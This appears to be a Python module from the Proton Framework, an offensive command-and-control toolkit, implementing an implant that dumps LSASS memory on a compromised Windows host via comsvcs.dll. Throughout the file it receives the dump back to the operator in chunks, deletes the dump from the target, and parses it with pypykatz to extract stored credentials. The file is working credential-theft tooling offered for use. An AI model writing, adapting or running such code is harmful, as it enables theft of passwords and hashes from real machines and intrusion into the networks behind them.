#!/usr/bin/env python3

#            ---------------------------------------------------
#                             Proton Framework              
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import core.job
import core.implant
import uuid
import time
import os

class ComsvcsLSASSImplant(core.implant.Implant):

    NAME = "Comsvcs LSASS"
    DESCRIPTION = "Utilizes comsvcs.dll to create a MiniDump of LSASS, parses with pypykatz."
    AUTHORS = ["Entynetproject"]
    STATE = "implant/gather/comsvcs_lsass"

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "Writeable directory for output", required=False)
        self.options.register("CHUNKSIZE", "10000000", "Size in bytes (kind of) of chunks to save.", required=True)
        self.options.register("CERTUTIL", "false", "Use certutil to base64 encode the file before downloading.", required=True, boolean=True)
        self.options.register("LPATH", "/tmp/", "Local file save path.")
        self.options.register("LSASSPID", "0", "Process ID of lsass.exe.", required=False)

    def job(self):
        return ComsvcsLSASSJob

    def run(self):
        payloads = {}
        payloads["js"] = "data/implant/gather/comsvcs_lsass.js"
        self.dispatch(payloads, self.job)

class ComsvcsLSASSJob(core.job.Job):
    def create(self):
        self.katz_output = ""
        if self.session_id == -1:
            return
        if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
            self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated!", "")
            return False

    def report(self, handler, data, sanitize = False):

        task = handler.get_header("Task", False)

        if task == 'pid':
            handler.reply(200)
            self.print_info("Detected lsass.exe process ID: "+data.decode()+"...")
            return

        if task == 'nopid':
            handler.reply(200)
            self.print_warning("Could not identify lsass.exe process ID. Please provide manually...")
            return

        if task == 'startrun':
            handler.reply(200)
            self.print_status("Creating a MiniDump with comsvcs.dll...")
            return

        if task == 'endrun':
            handler.reply(200)
            self.print_status("Finishing creating MiniDump...")
            return

        if task == 'upload':
            handler.reply(200)
            self.print_status("Downloading lsass bin file...")
            return

        if task == 'delbin':
            handler.reply(200)
            self.print_status("Removing lsass bin file from target...")
            super(ComsvcsLSASSJob, self).report(handler, data, False)

        if task == 'dump':
            self.save_fname = self.options.get("LPATH") + "/lsass." + self.ip + "." + uuid.uuid4().hex
            self.save_fname = self.save_fname.replace("//", "/")

            i = 0
            step = int(self.options.get("CHUNKSIZE"))
            partfiles = []
            datalen = len(data)
            while i < datalen:
                with open(self.save_fname+str(i), "wb") as f:
                    partfiles.append(self.save_fname+str(i))
                    end = i+step
                    if end > datalen:
                        end = datalen
                    while True:
                        try:
                            pdata = self.decode_downloaded_data(data[i:end], handler.get_header("encoder", "1252"))
                        except:
                            end -= 1
                            continue
                        break
                    try:
                        # if the data is just a text file, we want to decode correctly and then re-encode
                        pdata = pdata.decode('cp'+handler.get_header("encoder", "1252")).encode()
                    except:
                        pass
                    f.write(pdata)
                i = end

            with open(self.save_fname, "wb+") as f:
                for p in partfiles:
                    f.write(open(p, "rb").read())
                    os.remove(p)
            self.save_len = len(data)

            if self.options.get("CERTUTIL") == "true":
                with open(self.save_fname, "rb") as f:
                    data = f.read()
                data = self.decode_downloaded_data(data, "936")
                with open(self.save_fname, "wb") as f:
                    f.write(data)

            self.print_status("Parsing with pypykatz...")

            from pypykatz.pypykatz import pypykatz
            from pypykatz.commons.common import UniversalEncoder

            r = []
            mimi = pypykatz.parse_minidump_file(self.save_fname)
            r.append(mimi)

            import json
            json_results = json.loads(json.dumps(r, cls = UniversalEncoder))[0]

            cp = core.cred_parser.CredParse(self)
            self.katz_output = cp.parse_pypykatz(json_results)
            handler.reply(200)

    def done(self):
        rfile = "lsass.bin"
        if self.save_len == 0:
            self.print_warning("The file is empty.")
        self.results = "%s saved to %s (%d bytes)" % (rfile, self.save_fname, self.save_len)
        if self.katz_output: self.results += "\n"+self.katz_output
        self.print_status(self.results.split("\n")[0])
        self.display()

    def display(self):
        if self.katz_output:
            self.print_good(self.katz_output)
        else:
            self.error("", "", "", "")
